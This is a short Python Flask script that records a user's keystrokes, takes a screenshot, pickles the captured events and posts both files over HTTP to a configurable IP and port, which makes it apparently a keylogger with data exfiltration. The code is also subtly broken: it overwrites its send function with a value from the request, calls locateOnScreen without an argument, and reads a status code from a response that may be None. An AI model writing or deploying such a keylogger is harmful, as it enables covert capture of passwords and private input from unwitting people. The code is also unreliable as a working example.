from flask import Flask, request, jsonify
import requests # Import requests library
import keyboard # Import keyboard library
import pickle # Import pickle library

app = Flask(__name__)

@app.route('/record', methods=['POST'])
def record():
    data = request.json
    
    if 'send_data' in data and 'record_screen' in data:
        send_data = data['send_data']
        
        # Get all possible keys that the user can press
        keys = keyboard.all_keys
        
        # Monitor the keyboard for any events until 'Esc' is pressed
        print("Recording started. Press 'Esc' to stop.")
        events = keyboard.record(until='Esc')
        print("Recording stopped.")
        
        # Replay the recorded events (optional)
        print("Replaying recorded events.")
        keyboard.play(events)
        
        # Record the screen, if enabled by the user
        if data['record_screen']:
            import pyautogui
            
            # Configure recording settings (e.g., resolution and frame rate)
            pyautogui.screenshot('output.png', region=pyautogui.locateOnScreen())
            
        # Serialize the recorded events into a binary format and save them in a file
        with open('output.pkl', 'wb') as f:
            pickle.dump(events, f)
        
        # Call the send_data function with the IP address and port as arguments
        response = send_data('127.0.0.1', 5500) # Change this line to use hardcoded values or environment variables or command-line arguments
        
        if response.status_code == 200:
            return jsonify({'message': 'Data sent successfully.'})
        else:
            return jsonify({'error': f'Error sending data: {response.text}'})
    else:
        return jsonify({'error': 'Invalid data format.'}), 400

# Define a function to send data to any IP address and port that are specified
def send_data(ip_address, port):
    # Construct the URL of the /record endpoint using the ip_address and port parameters
    url = f'http://{ip_address}:{port}/record'
    
    # Send a POST request to the URL with the output and events files
    try:
        response = requests.post(url, files={'output': open('output.png', 'rb'), 'events': open('output.pkl', 'rb')})
        return response
    except Exception as e:
        # Handle any errors that may occur
        print(f'Error sending data: {e}')
        return None

if __name__ == '__main__':
    
     app.run(host='127.0.0.1', port=5500, )
